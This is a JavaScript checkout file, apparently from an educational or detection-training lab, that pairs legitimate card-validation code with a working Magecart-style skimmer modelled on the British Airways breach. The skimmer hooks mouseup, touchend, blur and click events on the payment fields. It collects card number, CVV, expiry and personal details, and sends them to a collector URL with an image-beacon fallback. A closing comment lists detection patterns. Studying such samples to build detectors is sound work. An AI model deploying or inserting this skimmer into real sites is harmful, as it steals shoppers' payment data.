/**
 * CHECKOUT.JS - COMPROMISED VERSION (EVENT LISTENER VARIANT)
 *
 * This variant demonstrates the same attack using different event triggers
 * based on the British Airways attack pattern (mouseup/touchend events).
 *
 * Key changes from base variant:
 * - Uses mouseup, touchend, and blur events instead of submit
 * - Monitors individual form fields in real-time
 * - Captures data as user completes each field
 * - Mobile-friendly touch event support
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

// ============================================================================
// PART 1: LEGITIMATE CHECKOUT CODE
// ============================================================================

;(function () {
  'use strict'

  console.log('[Checkout] Initializing legitimate checkout system...')

  /**
   * Validate credit card number using Luhn algorithm
   */
  function validateCardNumber(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '')

    if (digits.length < 15 || digits.length > 16) {
      return { valid: false, error: 'Card number must be 15-16 digits' }
    }

    // Luhn algorithm
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    const luhnValid = sum % 10 === 0
    if (!luhnValid) {
      return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' }
    }

    return { valid: true }
  }

  /**
   * Validate expiry date
   */
  function validateExpiry(expiry) {
    const parts = expiry.split('/')
    if (parts.length !== 2) return false

    const month = parseInt(parts[0])
    const year = parseInt('20' + parts[1])

    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentYear = now.getFullYear()
    const currentMonth = now.getMonth() + 1

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false

    return true
  }

  /**
   * Validate CVV
   */
  function validateCVV(cvv, cardNumber) {
    const digits = cvv.replace(/\D/g, '')
    const cleanCard = cardNumber.replace(/\D/g, '')

    // Amex (starts with 34 or 37) uses 4-digit CVV
    if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
      return digits.length === 4
    }

    // Others use 3-digit CVV
    return digits.length === 3
  }

  /**
   * Show validation error
   */
  function showError(fieldId, message) {
    const field = document.getElementById(fieldId)
    field.style.borderColor = '#e74c3c'

    // Remove any existing error message
    const existingError = field.parentElement.querySelector('.error-message')
    if (existingError) {
      existingError.remove()
    }

    // Add error message
    const errorDiv = document.createElement('div')
    errorDiv.className = 'error-message'
    errorDiv.style.color = '#e74c3c'
    errorDiv.style.fontSize = '0.9rem'
    errorDiv.style.marginTop = '0.25rem'
    errorDiv.textContent = message
    field.parentElement.appendChild(errorDiv)

    // Focus the field
    field.focus()
  }

  /**
   * Clear validation errors
   */
  function clearErrors() {
    document.querySelectorAll('.error-message').forEach(el => el.remove())
    document.querySelectorAll('input, select').forEach(el => {
      el.style.borderColor = '#ddd'
    })
  }

  /**
   * Process payment (simulated)
   */
  function processPayment(formData) {
    console.log('[Checkout] Processing payment...')
    console.log('[Checkout] IMPORTANT: This is a simulated transaction')

    return new Promise(resolve => {
      setTimeout(() => {
        console.log('[Checkout] Payment processed successfully (simulated)')
        console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now())
        resolve({
          success: true,
          transactionId: 'TXN-' + Date.now()
        })
      }, 1000)
    })
  }

  /**
   * Handle form submission
   */
  async function handleSubmit(event) {
    event.preventDefault()

    console.log('[Checkout] Form submitted')
    clearErrors()

    // Get form values
    const cardNumber = document.getElementById('card-number').value
    const cvv = document.getElementById('cvv').value
    const expiry = document.getElementById('expiry').value

    // Validate card number
    const cardValidation = validateCardNumber(cardNumber)
    if (!cardValidation.valid) {
      showError('card-number', cardValidation.error)
      return false
    }

    // Validate expiry
    if (!validateExpiry(expiry)) {
      showError('expiry', 'Card has expired or invalid date')
      return false
    }

    // Validate CVV
    if (!validateCVV(cvv, cardNumber)) {
      showError('cvv', 'Invalid CVV code')
      return false
    }

    // Show loading state
    const submitBtn = document.querySelector('.submit-btn')
    const originalText = submitBtn.textContent
    submitBtn.textContent = 'Processing...'
    submitBtn.disabled = true

    try {
      const formData = new FormData(event.target)
      const data = Object.fromEntries(formData.entries())

      const result = await processPayment(data)

      if (result.success) {
        event.target.style.display = 'none'
        const successMessage = document.getElementById('success-message')
        successMessage.classList.add('show')

        console.log('[Checkout] Order completed successfully')
      }
    } catch (error) {
      console.error('[Checkout] Payment processing error:', error)
      alert('Payment processing failed. Please try again.')

      submitBtn.textContent = originalText
      submitBtn.disabled = false
    }
  }

  /**
   * Initialize checkout
   */
  function init() {
    const form = document.getElementById('payment-form')

    if (form) {
      form.addEventListener('submit', handleSubmit)
      console.log('[Checkout] Checkout system ready')
    }
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()

// ============================================================================
// PART 2: EVENT LISTENER VARIANT MALICIOUS CODE
// ============================================================================
//
// This code demonstrates event-based skimming techniques used by attackers
// like the British Airways breach. Instead of form submission, it monitors:
// - mouseup events (when user releases mouse button)
// - touchend events (when user lifts finger on mobile)
// - blur events (when user moves away from form fields)
// - button interactions (purchase button clicks)
//
// This approach captures data in real-time as users interact with fields.
// ============================================================================

;(function () {
  'use strict'

  // British Airways-style attack: 22 lines of JavaScript (keeping it minimal)
  setTimeout(function () {
    const CONFIG = {
      exfilUrl: 'http://localhost:9002/collect',
      debug: true
    }

    function log(message, data) {
      if (CONFIG.debug) {
        console.log('[SKIMMER]', message, data || '')
      }
    }

    // Store collected data progressively
    let collectedData = {}

    function getFieldValue(selectors) {
      for (let selector of selectors) {
        const element = document.querySelector(selector)
        if (element && element.value) {
          return element.value.trim()
        }
      }
      return ''
    }

    function updateCollectedData(fieldType, value) {
      if (value && value.length > 0) {
        collectedData[fieldType] = value
        log(`Updated ${fieldType}:`, value.replace(/./g, '*')) // Mask for logging
      }
    }

    function extractCardData() {
      log('Extracting card data from collected fields...')
      const data = {
        cardNumber:
          collectedData.cardNumber || getFieldValue(['#card-number', '[name="cardNumber"]']),
        cvv: collectedData.cvv || getFieldValue(['#cvv', '[name="cvv"]']),
        expiry: collectedData.expiry || getFieldValue(['#expiry', '[name="expiry"]']),
        cardholderName:
          collectedData.cardholderName ||
          getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
        billingAddress:
          collectedData.billingAddress ||
          getFieldValue(['#billing-address', '[name="billingAddress"]']),
        city: collectedData.city || getFieldValue(['#city', '[name="city"]']),
        zip: collectedData.zip || getFieldValue(['#zip', '[name="zip"]']),
        country: collectedData.country || getFieldValue(['#country', '[name="country"]']),
        email: collectedData.email || getFieldValue(['#email', '[name="email"]']),
        phone: collectedData.phone || getFieldValue(['#phone', '[name="phone"]'])
      }

      // Add metadata
      data.metadata = {
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: screen.width + 'x' + screen.height,
        collectionMethod: 'event-listener-variant' // Track variant type
      }

      return data
    }

    function hasValidCardData(data) {
      const cleanCard = data.cardNumber.replace(/[\s-]/g, '')
      const validLength = cleanCard.length === 15 || cleanCard.length === 16
      const validCVV = data.cvv.length === 3 || data.cvv.length === 4
      return validLength && validCVV && data.expiry
    }

    function exfiltrateData(data) {
      log('Exfiltrating data to C2 server:', data)

      fetch(CONFIG.exfilUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        mode: 'cors',
        credentials: 'omit'
      })
        .then(response => {
          log('Fetch response status:', response.status)
          return response.text()
        })
        .then(responseText => {
          log('Data successfully exfiltrated via event listeners')
        })
        .catch(error => {
          // Fallback image beacon
          const img = new Image()
          img.src = CONFIG.exfilUrl + '?' + btoa(JSON.stringify(data))
        })
    }

    function attachFieldListeners() {
      log('Initializing event listener skimmer...')

      // Define field mappings for real-time collection
      const fieldMappings = [
        { selectors: ['#card-number'], type: 'cardNumber' },
        { selectors: ['#cvv'], type: 'cvv' },
        { selectors: ['#expiry'], type: 'expiry' },
        { selectors: ['#cardholder-name'], type: 'cardholderName' },
        { selectors: ['#billing-address'], type: 'billingAddress' },
        { selectors: ['#city'], type: 'city' },
        { selectors: ['#zip'], type: 'zip' },
        { selectors: ['#country'], type: 'country' },
        { selectors: ['#email'], type: 'email' },
        { selectors: ['#phone'], type: 'phone' }
      ]

      fieldMappings.forEach(mapping => {
        mapping.selectors.forEach(selector => {
          const element = document.querySelector(selector)
          if (element) {
            log(`Attaching listeners to ${selector}`)

            // British Airways technique: mouseup and touchend events
            element.addEventListener('mouseup', () => {
              setTimeout(() => updateCollectedData(mapping.type, element.value), 50)
            })

            element.addEventListener('touchend', () => {
              setTimeout(() => updateCollectedData(mapping.type, element.value), 50)
            })

            // Also monitor blur (when user moves away from field)
            element.addEventListener('blur', () => {
              updateCollectedData(mapping.type, element.value)
            })
          }
        })
      })

      // Monitor purchase button interactions
      const submitBtn = document.querySelector('.submit-btn, button[type="submit"]')
      if (submitBtn) {
        log('Attaching button interaction listeners')

        ;['mouseup', 'touchend', 'click'].forEach(eventType => {
          submitBtn.addEventListener(eventType, () => {
            log('Purchase button interaction detected')

            const cardData = extractCardData()
            if (hasValidCardData(cardData)) {
              log('Valid card data collected, preparing exfiltration')
              setTimeout(() => exfiltrateData(cardData), 100)
            }
          })
        })
      }

      log('Event listener skimmer ready and monitoring field interactions')
    }

    // Initialize when form is available
    const checkForm = setInterval(() => {
      const form = document.querySelector('#payment-form')
      if (form) {
        clearInterval(checkForm)
        log('Payment form found, attaching event listeners')
        attachFieldListeners()
      }
    }, 100)

    setTimeout(() => clearInterval(checkForm), 10000)
  }, 300) // Shorter delay than original - more aggressive
})()

/**
 * EVENT LISTENER VARIANT ANALYSIS:
 *
 * This variant demonstrates the British Airways attack pattern using event listeners
 * instead of form submission monitoring.
 *
 * Key differences from base variant:
 * 1. Multiple event listeners: mouseup, touchend, blur, click
 * 2. Real-time data collection as user interacts with fields
 * 3. Progressive data storage in memory
 * 4. Button interaction monitoring for trigger events
 * 5. Mobile-friendly touch event support
 *
 * British Airways technique characteristics:
 * - 22 lines of JavaScript (minimal footprint)
 * - mouseup and touchend events for cross-platform compatibility
 * - Real-time monitoring without waiting for form submission
 * - More aggressive timing (300ms vs 500ms delay)
 *
 * Detection Patterns:
 * - Multiple addEventListener calls on form fields
 * - mouseup and touchend event monitoring
 * - blur event listeners on input elements
 * - Progressive data collection patterns
 * - Button-specific event interception
 *
 * Despite different triggers, core functionality remains identical:
 * - Same form field extraction
 * - Same JSON data structure
 * - Same POST exfiltration method
 * - Same fallback image beacon
 *
 * ML Training Value:
 * This variant tests detection models' ability to:
 * - Recognize different event-based collection patterns
 * - Detect real-time vs batch data collection
 * - Identify touch event abuse on mobile platforms
 * - Spot button interaction hijacking
 * - Generalize across behavioral variations
 */
